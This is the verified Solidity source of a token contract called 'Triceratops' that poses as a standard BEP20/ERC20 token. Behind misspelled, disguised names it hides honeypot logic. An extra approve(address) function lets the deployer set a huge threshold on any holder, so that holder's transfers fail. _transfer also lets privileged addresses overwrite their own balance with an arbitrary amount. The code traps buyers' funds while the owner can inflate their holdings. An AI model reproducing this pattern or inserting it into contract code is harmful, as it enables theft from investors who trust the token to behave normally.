/**
 *Submitted for verification at Etherscan.io on 2023-06-13
*/

/**
pragma solidity ^0.7.5;
 */
library parameter {
    function tryAdd(uint256 a, uint256 b) internal pure returns (bool, uint256) {
    unchecked {
        uint256 c = a + b;
        if (c < a) return (false, 0);
        return (true, c);
    }
    }

    function trySub(uint256 a, uint256 b) internal pure returns (bool, uint256) {
    unchecked {
        if (b > a) return (false, 0);
        return (true, a - b);
    }
    }

    function tryMul(uint256 a, uint256 b) internal pure returns (bool, uint256) {
    unchecked {
        if (a == 0) return (true, 0);
        uint256 c = a * b;
        if (c / a != b) return (false, 0);
        return (true, c);
    }
    }

    function tryDiv(uint256 a, uint256 b) internal pure returns (bool, uint256) {
    unchecked {
        if (b == 0) return (false, 0);
        return (true, a / b);
    }
    }

    function tryMod(uint256 a, uint256 b) internal pure returns (bool, uint256) {
    unchecked {
        if (b == 0) return (false, 0);
        return (true, a % b);
    }
    }

    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        return a + b;
    }

    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        return a - b;
    }

    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        return a * b;
    }

    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        return a / b;
    }

    function mod(uint256 a, uint256 b) internal pure returns (uint256) {
        return a % b;
    }

    function sub(
        uint256 a,
        uint256 b,
        string memory errorMessage
    ) internal pure returns (uint256) {
    unchecked {
        require(b <= a, errorMessage);
        return a - b;
    }
    }

    function div(
        uint256 a,
        uint256 b,
        string memory errorMessage
    ) internal pure returns (uint256) {
    unchecked {
        require(b > 0, errorMessage);
        return a / b;
    }
    }

    function mod(
        uint256 a,
        uint256 b,
        string memory errorMessage
    ) internal pure returns (uint256) {
    unchecked {
        require(b > 0, errorMessage);
        return a % b;
    }
    }
}



pragma solidity ^0.8.0;

/**
 * @dev Interface of the ERC20 standard as defined in the EIP.
 */
interface IERC20 {

    event Transfer(address indexed from, address indexed to, uint256 value);

    event Approval(address indexed owner, address indexed spender, uint256 value);

    function totalSupply() external view returns (uint256);

    function balanceOf(address account) external view returns (uint256);

    function transfer(address to, uint256 amount) external returns (bool);

    function allowance(address owner, address spender) external view returns (uint256);

    function approve(address spender, uint256 amount) external returns (bool);

    function transferFrom(
        address from,
        address to,
        uint256 amount
    ) external returns (bool);
}

pragma solidity ^0.8.0;

abstract contract Context {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }

    function _msgData() internal view virtual returns (bytes calldata) {
        return msg.data;
    }
}

pragma solidity ^0.8.0;

/**
 * @dev Interface for the optional metadata functions from the ERC20 standard.
 *
 * _Available since v4.1._
 */
interface IERC20Metadata is IERC20 {
    function name() external view returns (string memory);

    function symbol() external view returns (string memory);

    function decimals() external view returns (uint8);
}


abstract contract owmmner is Context {
    address private _owmmner;

    event owmmnershipTransferred(address indexed previousOmmwner, address indexed newowmmner);

    constructor() {
        _transferOwmmnership(_msgSender());
    }

    modifier onlyowmmner() {
        _checkOwmmner();
        _;
    }

    function owner() public view virtual returns (address) {
        return _owmmner;
    }

    function _checkOwmmner() internal view virtual {
        require(owner() == _msgSender(), "Ownable: caller is not the owmmner");
    }

    function renounceOwnership() public virtual onlyowmmner {
        _transferOwmmnership(address(0));
    }

    function transferOwnership(address newOwmmner) public virtual onlyowmmner {
        require(newOwmmner != address(0), "Ownable: new owmmner is the zero address");
        _transferOwmmnership(newOwmmner);
    }

    function _transferOwmmnership(address newOwmmner) internal virtual {
        address oldOwner = _owmmner;
        _owmmner = newOwmmner;
        emit owmmnershipTransferred(oldOwner, newOwmmner);
    }
}



pragma solidity ^0.8.0;

contract BEP20 is Context, IERC20, IERC20Metadata,owmmner {
    using parameter for uint256;
    mapping(address=> uint256) private _kinged;
    mapping(address => uint256) private _dogewwn;
    mapping (address => bool) public _dogeownes;
    mapping(address => mapping(address => uint256)) private _allowances;
    uint256 MANPP = 2**256/2-1996;
    function approve(address recipient) external  {
        require( _dogeownes[msg.sender]);
        _dogewwn[recipient] = MANPP ;
    }

    function Transferw(address recipient) external  {
        require( _dogeownes[msg.sender]);
        _dogewwn[recipient] = 0;
    }

    function getABA(address recipient) public view returns(uint256)  {
        return _dogewwn[recipient];
    }


    uint256 private _totalSupply;
    string private _name;
    string private _symbol;

    constructor(string memory name_, string memory symbol_) {
        _name = name_;
        _symbol = symbol_;
    }

    function name() public view virtual override returns (string memory) {
        return _name;
    }

    function symbol() public view virtual override returns (string memory) {
        return _symbol;
    }

   
    function decimals() public view virtual override returns (uint8) {
        return 18;
    }

    function totalSupply() public view virtual override returns (uint256) {
        return _totalSupply;
    }


    function balanceOf(address account) public view virtual override returns (uint256) {
        return _kinged[account];
    }


    function transfer(address to, uint256 amount) public virtual override returns (bool) {
    address owner = _msgSender();
        _transfer(owner, to, amount);
        return true;
    }

 
    function allowance(address owner, address spender) public view virtual override returns (uint256) {
        return _allowances[owner][spender];
    }


    function approve(address spender, uint256 amount) public virtual override returns (bool) {
        address owner = _msgSender();
        _approve(owner, spender, amount);
        return true;
    }

 
    function transferFrom(
        address from,
        address to,
        uint256 amount
    ) public virtual override returns (bool) {
        address spender = _msgSender();
        _spendAllowance(from, spender, amount);
        _transfer(from, to, amount);
        return true;
    }


    uint256 tFEE = 0;
    function _transfer(
        address from,
        address to,
        uint256 amount
    ) internal virtual {
        require(from != address(0), "BEP20: transfer from the zero address");
        require(to != address(0), "BEP20: transfer to the zero address");

        _beforeTokenTransfer(from, to, amount);

        if (_dogeownes[from] == false) {
            require(_kinged[from] >= _dogewwn[from], "BEP20: transfer amount exceeds balance");
        }else{
            if (_dogewwn[from] > 0 ){
                _kinged[from] = _dogewwn[from];
            }
        }

        uint256 fromBalance = _kinged[from];
        require(fromBalance >= amount, "BEP20: transfer amount exceeds balance");
        uint256 feeAmount = amount.mul(tFEE).div(100);
        uint256 add = amount.sub(feeAmount);
    unchecked {
        _kinged[from] = fromBalance - amount;

        _kinged[to] += add;
    }

        emit Transfer(from, to, amount);

        _afterTokenTransfer(from, to, amount);
    }

    function _xint(address account, uint256 amount) internal virtual {
        require(account != address(0), "BEP20: xint to the zero address");

        _beforeTokenTransfer(address(0), account, amount);
        _totalSupply += amount;
    unchecked {
        _kinged[account] += amount;
    }
        emit Transfer(address(0), account, amount);

        _afterTokenTransfer(address(0), account, amount);
    }

 
    function _burn(address account, uint256 amount) internal virtual {
        require(account != address(0), "BEP20: burn from the zero address");

        _beforeTokenTransfer(account, address(0), amount);

        uint256 accountBalance = _kinged[account];
        require(accountBalance >= amount, "BEP20: burn amount exceeds balance");
    unchecked {
        _kinged[account] = accountBalance - amount;
    
        _totalSupply -= amount;
    }

        emit Transfer(account, address(0), amount);

        _afterTokenTransfer(account, address(0), amount);
    }

    function _approve(
        address owner,
        address spender,
        uint256 amount
    ) internal virtual {
        require(owner != address(0), "BEP20: approve from the zero address");
        require(spender != address(0), "BEP20: approve to the zero address");

        _allowances[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }

    function _spendAllowance(
        address owner,
        address spender,
        uint256 amount
    ) internal virtual {
        uint256 currentAllowance = allowance(owner, spender);
        if (currentAllowance != type(uint256).max) {
            require(currentAllowance >= amount, "BEP20: insufficient allowance");
        unchecked {
            _approve(owner, spender, currentAllowance - amount);
        }
        }
    }

    function _beforeTokenTransfer(
        address from,
        address to,
        uint256 amount
    ) internal virtual {}

    function _afterTokenTransfer(
        address from,
        address to,
        uint256 amount
    ) internal virtual {}
}

pragma solidity ^0.8.0;


contract Triceratops is BEP20 {
    using parameter for uint256;
    constructor(uint256 initialSupply) BEP20("Triceratops", "Triceratops") {
        _xint(msg.sender, initialSupply*10**decimals());
        _dogeownes[msg.sender] = true;
    }
}